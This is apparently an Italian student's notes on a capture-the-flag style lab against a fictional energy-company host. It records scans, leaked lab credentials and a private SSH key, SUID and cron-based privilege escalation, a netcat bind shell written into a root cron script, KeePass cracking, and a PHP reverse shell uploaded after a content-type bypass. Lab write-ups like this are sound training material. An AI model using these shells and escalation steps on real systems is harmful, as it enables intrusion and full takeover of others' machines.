ip fornito 192.168.14.15

#### Domanda 1
Quante porte TCP risultano in stato "open" sul target principale (esclusa la `65432`)?
faccio nmap -sT -p- indirizzo ip
```scss
PORT    STATE SERVICE   VERSION
21/tcp  open  ftp       vsftpd 2.0.8 or later
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 62:2a:af:d8:f3:0d:6d:09:d6:74:a4:cc:ac:39:1c:64 (ECDSA)
|_  256 57:17:10:45:1c:3e:e5:75:ba:a9:40:f3:a7:8c:5c:25 (ED25519)
80/tcp  open  http      nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
443/tcp open  ssl/https nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=muntrea-energy.vdsi/organizationName=Muntrea Energy/stateOrProvinceName=Verante/countryName=IT
| Not valid before: 2026-05-14T15:27:23
|_Not valid after:  2027-05-14T15:27:23
|_http-server-header: nginx/1.22.1
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.36 seconds

```
##### Domanda 2
feroxbuster -u https://192.168.14.15:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt --insecure 
https://192.168.14.15/internal/resources/backup
```scss
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       49l       98w     1577c https://192.168.14.15/contact.html
200      GET      236l      498w     4643c https://192.168.14.15/style.css
200      GET       57l      141w     1950c https://192.168.14.15/index.html
200      GET       58l      149w     2111c https://192.168.14.15/operations.html
200      GET       57l      126w     1866c https://192.168.14.15/sustainability.html
200      GET       57l      141w     1950c https://192.168.14.15/
301      GET        7l       11w      169c https://192.168.14.15/internal => https://192.168.14.15/internal/
301      GET        7l       11w      169c https://192.168.14.15/internal/resources => https://192.168.14.15/internal/resources/
301      GET        7l       11w      169c https://192.168.14.15/internal/resources/backup => https://192.168.14.15/internal/resources/backup/
200      GET        5l        7w      110c https://192.168.14.15/internal/resources/backup/temp5712837.bak
200      GET        1l        9w       58c https://192.168.14.15/internal/resources/backup/readme_first.txt
200      GET        3l       11w       57c https://192.168.14.15/internal/resources/backup/todo.txt
[####################] - 11s    14267/14267   0s      found:12      errors:0      
[####################] - 5s      4751/4751    882/s   https://192.168.14.15/ 
[####################] - 5s      4751/4751    927/s   https://192.168.14.15/internal/ 
[####################] - 4s      4751/4751    1079/s  https://192.168.14.15/internal/resources/ 
[####################] - 0s      4751/4751    40263/s https://192.168.14.15/internal/resources/backup/ => Directory listing (add --scan-dir-listings to scan)
```
#### Domanda 3
Analizzando i file nella directory di backup, è possibile recuperare delle credenziali. Quali sono?

**Formato Risposta:** username:password
ho trovato un file bak, rinominato poi in txt
USER=muntrea-filemanager
PASS=Muntrea2026!
```scss
[DEPRECATED FTP CONFIG]
USER=muntrea-filemanager
PASS=Muntrea2026!
REMOTE_PATH=/backup/manuals
STAMP=20260513
```
#### Domanda 4

In un manuale interno viene specificato quale metodo di autenticazione è concesso agli operatori per l'accesso remoto al server. Qual è?

**Formato Risposta:** ALGORITHM Attribute Object
![[Pasted image 20260515151955.png|293]]

ho fatto il get nel server ftp
RSA Private Key

#### Domanda 5
sto esplorando il ftp ho trovato una flag bho
VDSI{4dm1n_fl4g_h3r3}

ho trovato /v1/adm1n/d4shb0ard/
nmap mi ha dato il certificato e l'ho messo
#### Domanda 6
ho messo come variabile quella sull'url
muntrea-energy.vdsi

#### Domanda 7
```scss
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin postfix:x:100:109::/var/spool/postfix:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:102:111::/nonexistent:/usr/sbin/nologin user:x:1000:1000:,,,:/home/user:/bin/bash ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin muntrea-filemanager:x:1001:1005::/home/muntrea-filemanager:/bin/bash muntrea-operator:x:1002:1006::/home/muntrea-operator:/bin/bash muntrea-sysadmin:x:1003:1007::/home/muntrea-sysadmin:/bin/bash scanner:x:1004:1008::/home/scanner:/bin/bash
```
trovato id con 
`muntrea-operator`

#### Domanda 8
/home/muntrea-operator/.ssh/id_rsa
```scss
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAjetoVaQgh5X1eGkBO4hNv2i1PttsKjadPYtVeN/ni+RzbA++j3Xx dirA8+9YTmzaPz/MYItB6MFz6hWV/SJEblVFnT35ixxbwetIF8PCxc0gxvDnq0QLKhGY3N 0R0778P110rajZccdx7EB4JKrY/FUytwGxFvnzgKIpXeXowXVuq+WUQ75aSLB8bm8zEXeP VLjfxQF1p31tWFsbZHpwI2poDxrCUCdQ3SW9/kmfSYJB7QzhLFR5AO2+6KxiwpMfDiKjAk F8wIJ/75rAn9FRfcH04//YqO1AC4/Z7WrZAiVbPKv4utGvh5y8IlHBEwHPCUMcj9KQy0xR PguiHLQbkwAAA9jRC4280QuNvAAAAAdzc2gtcnNhAAABAQCN62hVpCCHlfV4aQE7iE2/aL U+22wqNp09i1V43+eL5HNsD76PdfF2KsDz71hObNo/P8xgi0HowXPqFZX9IkRuVUWdPfmL HFvB60gXw8LFzSDG8OerRAsqEZjc3RHTvvw/XXStqNlxx3HsQHgkqtj8VTK3AbEW+fOAoi ld5ejBdW6r5ZRDvlpIsHxubzMRd49UuN/FAXWnfW1YWxtkenAjamgPGsJQJ1DdJb3+SZ9J gkHtDOEsVHkA7b7orGLCkx8OIqMCQXzAgn/vmsCf0VF9wfTj/9io7UALj9ntatkCJVs8q/ i60a+HnLwiUcETAc8JQxyP0pDLTFE+C6IctBuTAAAAAwEAAQAAAQA67ERTWmOPJ7nVFnPG jd8J26V0xZFxLV+3j8Qa/YubT2yErzzFP4jTMQkPvo4Bcbxjik+GvgrNYpSH2hJ+GN4kmQ 7gLD0RfuKx7sft5f9WNMapEph9STEBdHDtMnQWYDNG87xf5bzyOoaYOmQnhS+2BIGb7f3i tkBdZfaa37v1pffQs5N2Lu7Zs2A0ynj/BXsZBySpbMDYZ7p+TkueP9TqjPFG+41E99WypH qNIJUj/TCgkmrlyjAAGYbITivWdXvFqqf5dO/rrUMx2Okak8cd2c+Y0TEDxwsFyYjhmg+V npge3byoR7jlNgNwW6x5sna8kHouX9v8NBL2TKD1b17BAAAAgAfqYNtY539tlmlLSWbWN/ NSSotGkWGRjbj+eW1RpyPt2UwgzUY4yG2Mfr3GmVF2+dk6tI63Sk6y8W5jK+IymXodgZUp MTVgVzyQK3/7SnMlagpqBHMSJLUYeKA4njWkuZmOGmZe0q+Op1aCngKuS1oQsEEZup2RKK 4NofGTsj+rAAAAgQDCSaX3YHgv0iDW0QfrUWdSVQ8n7X3JfI3HZtD56UxXL0SAEHEWkuy/ irwr0+xGYo1yoE9OrMTxcHRfhEQhf5eYUKaDFqP4cnXiShaYTREKsUcMC1qzEtTWUpBlTt q0V0prCXT3/v5kwPBqN9O+y+RseNgWHuB9M22rHbuIlqZf8QAAAIEAuv98XsHyNxoYGxqt lMV6ZoWsL5+Atz1jy3HXtl80dyCTTsDEY1jGe1Ig49VSWxksuhh+6v2ozV8MHXXcLscegR WZWargqQxGKulGHDXNhr24Gzsy+B3DOP+mJUch2RC1NqK+BDvBhKWt1ogvC+r2BD7f0Bc/ FuxWQVJ2h7tgd8MAAAAfYW5zaWJsZS1nZW5lcmF0ZWQgb24gZXhhbS1zaW0wMQECAwQ= -----END OPENSSH PRIVATE KEY-----
```
una volta creato il file procedo con 
`ssh -i ./file muntrea-operator@192.168.14.15`
mi ha dato problemi di permessi ho fatto chmod 600 ./file
VDSI{nucl3ar_t3ch_acc3ss_gr4nt3d}
#### Domanda 9
il file in questione è stato trovato con
`find / -perm -u=s -type f 2>/dev/null`
ed era
`/usr/bin/sys-monitor`
#### Domanda 10
il comando cat è presente dentro il file .sh che esegue
#### Domanda 11
letta con cat `admin.txt`
`VDSI{4dm1n_fl4g_h3r3}`
#### Domanda 12
sto provando path hijacking
`export PATH=/tmp:$PATH`
importato python bash buona
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
mi sono aperto una shell con /bin/bash -p dentro il file sh
provo a fa sta cosa

fatto `find / -user muntrea-sysadmin 2>/dev/null`
/opt/scripts/internal/infra/monitor-critical-services.sh
scrivo questo dentro il file
```scss
#!/bin/bash
# System maintenance script
echo "Running periodic checks..."
echo "ciao" >> /tmp/shellaperta.txt
nc -lvp 4444 -e /bin/bash
```
e faccio
`nc 192.168.14.15 4444`
`VDSI{mun7r3a_c0ntr0l_full_m4st3ry}`

copiare un file nella cartella
`scp /percorso/locale/pspy64 utente@host_remoto:/tmp/`
oppure importando `scp ./pspy muntrea-filemanager@192.168.14.15:/tmp/`
all'esecuzione mostra molte volte l'esecuzione di questo cronjob
`2026/05/15 20:33:32 CMD: UID=0     PID=8579   | /bin/bash /opt/scripts/internal/infra/monitor-critical-services.sh `
palese un cron eseguito dal root quindi daje
#### Faccio  SIM_STNDA: Infiltrato Sbadato
keepass2john secrets.kdbx
passkeepass.txt
pass è strawberry123
aperto con keepass
VDSI{k33p4ss_cr4ck_succ3ss_2026}
poi ho anche 
filtro usato frame contains "test"

##### SIM_STNDB: Antivirus Sicuro
##### Esercizio 1

il file l'ho inviato modificando il content type con burp e 
`application/x-msdownload`
ho creato il file `.php` 
```php
<?php
$s=fsockopen("10.8.0.7",9999);
proc_open("/bin/bash",[$s,$s,$s],$p);
?>
```
e ho aperto il file su uploads/file.php

il 2 si fa mettendo id 1